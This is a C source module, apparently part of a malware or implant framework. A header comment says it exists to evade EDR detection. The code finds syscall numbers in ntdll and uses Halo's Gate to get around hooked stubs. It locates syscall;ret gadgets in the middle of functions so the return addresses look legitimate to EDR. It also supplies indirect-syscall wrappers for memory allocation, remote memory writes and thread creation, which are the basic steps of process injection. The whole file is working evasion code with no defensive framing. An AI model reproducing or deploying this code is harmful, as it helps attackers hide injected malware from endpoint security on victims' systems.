// chunk: evasion/syscall_trampoline
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: low
// note: Syscall trampoline — finds syscall;ret gadgets in the MIDDLE of legitimate ntdll functions (not at stub boundaries). The EDR sees a return address pointing inside a real ntdll function interior, not at a known Nt stub entry. Skips the first 32 bytes of every Nt* export to avoid stub-boundary gadgets that EDRs flag.

#ifndef CHUNK_SYSCALL_TRAMPOLINE
#define CHUNK_SYSCALL_TRAMPOLINE

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

static int st_is_clean_stub(BYTE *code) {
    return (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8);
}

static DWORD st_resolve_ssn(HMODULE ntdll, const char *func_name) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (strcmp(name, func_name) == 0) {
            BYTE *code = base + funcs[ords[i]];
            if (st_is_clean_stub(code))
                return *(DWORD *)(code + 4);

            // Hooked — walk neighbors (Halo's Gate)
            for (int d = 1; d < 500; d++) {
                if (i + d < exp->NumberOfNames) {
                    char *n = (char *)(base + names[i + d]);
                    if (n[0] == 'N' && n[1] == 't') {
                        BYTE *c = base + funcs[ords[i + d]];
                        if (st_is_clean_stub(c))
                            return *(DWORD *)(c + 4) - d;
                    }
                }
                if (i >= (DWORD)d) {
                    char *n = (char *)(base + names[i - d]);
                    if (n[0] == 'N' && n[1] == 't') {
                        BYTE *c = base + funcs[ords[i - d]];
                        if (st_is_clean_stub(c))
                            return *(DWORD *)(c + 4) + d;
                    }
                }
            }
            return 0;
        }
    }
    return 0;
}

static void *st_find_mid_function_gadget(HMODULE ntdll) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp_dir = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp_dir->AddressOfNames);
    WORD *ords = (WORD *)(base + exp_dir->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp_dir->AddressOfFunctions);

    // Collect all Nt* export RVAs so we can identify stub boundaries
    DWORD stub_rvas[512];
    DWORD stub_count = 0;

    for (DWORD i = 0; i < exp_dir->NumberOfNames && stub_count < 512; i++) {
        char *name = (char *)(base + names[i]);
        if (name[0] == 'N' && name[1] == 't') {
            stub_rvas[stub_count++] = funcs[ords[i]];
        }
    }

    // Scan executable sections for syscall;ret (0F 05 C3)
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        BYTE *start = base + sec[i].VirtualAddress;
        DWORD size = sec[i].Misc.VirtualSize;

        for (DWORD j = 0; j < size - 2; j++) {
            if (start[j] != 0x0F || start[j+1] != 0x05 || start[j+2] != 0xC3)
                continue;

            // Check if this gadget is within 32 bytes of any Nt stub start
            DWORD gadget_rva = sec[i].VirtualAddress + j;
            int at_stub_boundary = 0;

            for (DWORD k = 0; k < stub_count; k++) {
                DWORD diff = (gadget_rva > stub_rvas[k]) ?
                    gadget_rva - stub_rvas[k] : stub_rvas[k] - gadget_rva;
                if (diff < 32) {
                    at_stub_boundary = 1;
                    break;
                }
            }

            if (!at_stub_boundary)
                return (void *)(start + j);
        }
    }

    // Fallback: use any gadget if no mid-function one found
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }

    return NULL;
}

static int init_indirect_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    ssn_NtAllocateVirtualMemory = st_resolve_ssn(ntdll, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = st_resolve_ssn(ntdll, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = st_resolve_ssn(ntdll, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = st_resolve_ssn(ntdll, "NtQuerySystemInformation");
    syscall_ret_gadget = st_find_mid_function_gadget(ntdll);

    return (ssn_NtAllocateVirtualMemory != 0 &&
            ssn_NtWriteVirtualMemory != 0 &&
            ssn_NtCreateThreadEx != 0 &&
            ssn_NtQuerySystemInformation != 0 &&
            syscall_ret_gadget != NULL) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtQuerySystemInformation(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
